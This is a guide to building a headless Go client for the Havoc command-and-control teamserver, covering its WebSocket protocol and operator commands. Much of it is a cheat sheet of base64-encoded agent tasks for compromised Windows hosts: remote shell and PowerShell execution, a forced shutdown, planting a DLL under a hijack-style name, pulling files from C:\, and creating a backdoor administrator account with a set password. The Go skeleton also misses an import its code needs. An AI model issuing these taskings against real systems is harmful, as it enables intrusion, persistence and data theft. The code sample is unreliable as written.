# Building a Headless Havoc Client in Go

This guide explains how to replace the Qt-based GUI client with a custom headless client written in Go. It summarises the network protocol used between the existing client and the Havoc teamserver and outlines a reference architecture for interacting with the teamserver programmatically.

## Using the bundled headless client

The repository now includes a ready-to-run CLI client under the `headless` subcommand of the teamserver binary. Build the Go project and connect to a running teamserver instance:

```bash
cd teamserver
go build -o havoc
./havoc headless --host 127.0.0.1 --port 40056 --user operator --password "super-secret"
```

> **Tip:** Always run Go tooling from inside the `teamserver/` module. Invocations from the repository root will error with `go: cannot find main module` because the Go sources live beneath `teamserver/`.

Authentication also honours the `HAVOC_PASSWORD` environment variable, so you can omit `--password` and export the secret instead. The `--insecure=false` flag enables strict TLS verification, and `--no-prompt` starts the client in log-only mode without the interactive REPL. 【F:teamserver/cmd/headless/headless.go†L39-L118】

After a successful login you will land in a prompt that mirrors core GUI actions:

```text
Headless Havoc client ready. Type 'help' for a list of commands.
> listeners
NAME            PROTOCOL   BIND        PORT   HOSTS        STATUS   UPDATED
redirector      https      0.0.0.0     443    teamserver   RUNNING  2024-04-03T12:17:03Z
> agents
ID        USER@HOST        INTERNAL        EXTERNAL        PROCESS      PID   ARCH   SLEEP   STATUS
AGT0213   user@workstn     10.0.4.23       203.0.113.42    explorer.exe 1044  x64    30s     Alive
> chat Testing headless client
> task AGT0213 12 FromProcessManager=false
queued command 12 for agent AGT0213 (task 5b8f3a60)
> task AGT0213 0x1010 shell whoami ProcCommand=4 Args=0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;L2Mgd2hvYW1p
queued command 0x1010 for agent AGT0213 (task 3a21d91c)
> task AGT0213 2510 one-time
queued command 2510 for agent AGT0213 (task 181c0e24)
> mark AGT0213 Dead
```

* `listeners`, `agents`, and `chatlog` render cached state the reader thread maintains for you. 【F:teamserver/cmd/headless/headless.go†L421-L481】
* `chat <message>` broadcasts a base64-encoded message to every operator session. 【F:teamserver/cmd/headless/headless.go†L489-L512】
* `task <agent-id> <command-id> ...` submits work to the selected agent. Tokens without an equals sign become the `CommandLine` string while `key=value` pairs populate explicit fields in the package payload. Add the literal `one-time` token when you want the teamserver to treat the task as transient output. The client automatically supplies the `FromProcessManager=false` flag that the GUI always includes with process listings, so you only need to override it when queueing tasks from the process manager UI. 【F:teamserver/cmd/headless/headless.go†L514-L615】
* `mark <agent-id> <Alive|Dead>` updates the agent’s status flag in Havoc. 【F:teamserver/cmd/headless/headless.go†L571-L603】

Command identifiers line up with the constants in [`teamserver/pkg/agent/commands.go`](../teamserver/pkg/agent/commands.go). For example, `12` invokes `COMMAND_PROC_LIST` while `2510` triggers `COMMAND_SCREENSHOT`. Combine those values with sub-command key/value pairs (e.g. `SubCommand=1`) to reach deeper capabilities.

When replicating higher-level console actions (such as `shell`), translate the Qt client’s payloads before sending them. The GUI wraps shell execution inside the process module, so you need to send both the numeric process command and the encoded arguments:

```text
> task AGT0213 0x1010 shell whoami ProcCommand=4 Args=0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;L2Mgd2hvYW1p
```

That format mirrors `CommandExecute::ProcModule` inside the Qt source. `ProcCommand=4` selects the “create process” branch and the trailing base64 value (`L2Mgd2hvYW1p`) is the encoded `/c whoami` argument block that the demon expects. Use the other helpers in `client/src/Havoc/Demon/CommandSend.cc` as a reference when you script additional task types. 【F:client/src/Havoc/Demon/ConsoleInput.cc†L856-L877】【F:client/src/Havoc/Demon/CommandSend.cc†L284-L315】

## Common command translations

The Qt console also hides a fair amount of bookkeeping when it fires Python modules or file-system helpers. The headless CLI can reproduce the same behaviour, but you must expand the high-level command into the raw task payload yourself. Replace `<agent-id>` with the demon identifier shown by the `agents` command.

### PowerShell one-liners

Use the process module (`CommandID 0x1010`) with `ProcCommand=4`. The `Args` field must contain the literal string `0;FALSE;TRUE;` followed by the PowerShell path and a base64-encoded command line. The examples below mirror the Qt client’s `powershell` helper.

```text
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiTWFjaGluZSIp
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiVXNlciIp
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgU3RvcC1Db21wdXRlcg==
```

The three commands above retrieve the machine `PATH`, the user `PATH`, and issue `Stop-Computer`, respectively.

### File uploads and downloads

File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`.

```text
# Upload local DLL to %LOCALAPPDATA%\Temp
task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxXcHRzRXh0ZW5zaW9ucy5kbGw=<base64-data>

# Upload local EXE to %LOCALAPPDATA%\Temp
task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxzdW1tb24uZXhl<base64-data>

# Download individual files from C:\
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2FtYW50aGEudHh0
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc3lzdGVtaWMudHh0
task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2VjdXJpdHkudHh0
```

Replace `<base64-data>` with the base64-encoded contents of the file you want to upload (for example, `base64 -w0 /home/kali/WptsExtensions.dll`). When you queue a download the server streams the file back through the standard transfer channel, exactly as if you had used the GUI.

### Local account management

The GUI wraps module logic around simple PowerShell or `net.exe` commands. From the headless client you can reuse the PowerShell pattern from above to create a user and add it to the Administrators group. For example:

```text
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IHVzZXIgQ2FzcGVyIElhbUFHaG9zdDEyMzQ1ISEhIC9hZGQ=
task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgQ2FzcGVyIC9hZGQ=
```

These two tasks create the `Casper` account with the provided password and add it to the local Administrators group. Swap in any other account-management one-liners you prefer (for example `New-LocalUser` / `Add-LocalGroupMember`).

### About Python modules

Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.

## 1. Understand the Transport

* The Qt client connects to the teamserver over a WebSocket endpoint at `wss://<host>:<port>/havoc/` and ignores TLS validation errors. The same URI and TLS behaviour must be reproduced by the headless client. 【F:client/src/Havoc/Connector.cc†L10-L44】
* Messages are sent as binary WebSocket frames that contain JSON payloads. The JSON documents always wrap a `Head` and `Body` object that together form a `Package`. 【F:client/src/Havoc/Connector.cc†L19-L32】【F:client/src/Havoc/Packager.cc†L64-L106】

The Go client can reuse [`gorilla/websocket`](https://github.com/gorilla/websocket) for the transport layer. Use `tls.Config{InsecureSkipVerify: true}` if you need to replicate the GUI client’s decision to ignore certificate issues.

## 2. Reuse the Packager Types

The teamserver already defines Go structs for packages and the enumerations for all message types and sub-events. Instead of hard-coding constants, import or vendor the `teamserver/pkg/packager` module so the headless client can reuse `packager.Head`, `packager.Body`, and the `packager.Type` lookup table. 【F:teamserver/pkg/packager/types.go†L1-L135】

Each outbound and inbound message is modelled as:

```go
type Package struct {
    Head packager.Head `json:"Head"`
    Body packager.Body `json:"Body"`
}
```

The `Head.Event` number selects the high-level channel (listeners, sessions, chat, etc.) and `Body.SubEvent` picks the specific action.

## 3. Authenticate With the Teamserver

The login handshake uses a single package:

1. Set `Head.Event` to `packager.Type.InitConnection.Type`.
2. Set `Body.SubEvent` to `packager.Type.InitConnection.OAuthRequest`.
3. Place the operator username in both `Head.User` and `Body.Info["User"]`.
4. Hash the clear-text password with SHA3-256 and hex-encode it, then store the result in `Body.Info["Password"]`. 【F:client/src/Havoc/Connector.cc†L48-L69】【F:teamserver/cmd/server/teamserver.go†L560-L627】

On success the server replies with `InitConnection.Success` (SubEvent `0x1`), followed by a stream of cached events and profile information so the client can reconstruct state. 【F:teamserver/pkg/events/events.go†L18-L69】

## 4. Consume Server Events

After authentication the teamserver continuously emits events to describe listeners, chat messages, operator presence, agents (“demons”), and build settings. These packages follow the same `Head`/`Body` layout. Key examples include:

* Listener lifecycle notifications (`Event == packager.Type.Listener.Type`). The payload mirrors the handler configuration, so decoding into a generic map suffices. 【F:teamserver/pkg/events/listeners.go†L13-L120】
* Agent session events (`Event == packager.Type.Session.Type`) for new implants, console output, status changes, and task results. 【F:teamserver/pkg/events/demons.go†L17-L86】
* Teamserver logs and profile data (`Event == packager.Type.Teamserver.Type`). 【F:teamserver/pkg/events/teamserver.go†L1-L88】

Store these packages in-memory to maintain headless state (active agents, available listeners, pending tasks) in the same way as the GUI client’s tabs do.

## 5. Send Operator Actions

To task agents or manage listeners the client sends packages back to the server. The dispatcher in the teamserver shows the payloads it expects for each action:

* **Task an agent:**
  * Use `Event == packager.Type.Session.Type` and `SubEvent == packager.Type.Session.Input`.
  * Set `Body.Info["DemonID"]` to the agent’s `NameID` and `Body.Info["CommandID"]` to the numeric command string (e.g. `"1"` for `shell`).
  * Include command-specific arguments in `Body.Info` (for example `"CommandLine"`).
  * Optional: set `Head.OneTime = "true"` for transient jobs such as console-only messages. 【F:teamserver/cmd/server/dispatch.go†L22-L158】

* **Mark an agent:** send `SubEvent == packager.Type.Session.MarkAsDead` with `Body.Info["AgentID"]` and `Body.Info["Marked"]`. 【F:teamserver/pkg/events/demons.go†L88-L110】

* **Add or edit listeners:** reuse the same payloads that the server broadcasts for listener events; the dispatcher will forward them into the handler subsystem. 【F:teamserver/pkg/events/listeners.go†L13-L120】【F:teamserver/cmd/server/dispatch.go†L160-L252】

When broadcasting operator chat messages or status changes, mirror the structures emitted by the GUI client (`Event == packager.Type.Chat.Type`).

## 6. Reference Go Skeleton

The following skeleton shows the control flow for a minimal headless client:

```go
package main

import (
    "crypto/sha3"
    "encoding/hex"
    "log"
    "net/url"
    "time"

    "github.com/gorilla/websocket"

    "Havoc/teamserver/pkg/packager"
)

func main() {
    dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
    u := url.URL{Scheme: "wss", Host: "teamserver:40056", Path: "/havoc/"}

    conn, _, err := dialer.Dial(u.String(), nil)
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    passHash := sha3.Sum256([]byte("operator-password"))
    login := packager.Package{
        Head: packager.Head{
            Event: packager.Type.InitConnection.Type,
            User:  "operator",
            Time:  time.Now().Format("02/01/2006 15:04:05"),
        },
        Body: packager.Body{
            SubEvent: packager.Type.InitConnection.OAuthRequest,
            Info: map[string]any{
                "User":     "operator",
                "Password": hex.EncodeToString(passHash[:]),
            },
        },
    }

    if err := conn.WriteJSON(login); err != nil {
        log.Fatal(err)
    }

    for {
        var pk packager.Package
        if err := conn.ReadJSON(&pk); err != nil {
            log.Fatal(err)
        }

        // TODO: dispatch on pk.Head.Event / pk.Body.SubEvent
    }
}
```

Replace the `TODO` block with handlers that update your headless state machine and trigger actions. For outgoing messages, fill `packager.Package` values and call `conn.WriteJSON` or `conn.WriteMessage(websocket.BinaryMessage, ...)` as required.

## 7. Optional Enhancements

* Persist the current state to disk so reconnects can replay pending jobs before the server’s cached events arrive.
* Provide a CLI, REST, or gRPC layer on top of the core event loop so that other automation can drive Havoc without the GUI.
* Integrate operator authentication (e.g., environment variables or Vault) instead of storing hashed passwords on disk.

By mirroring the message flow captured above you can fully control the Havoc teamserver from Go without launching the Qt interface.
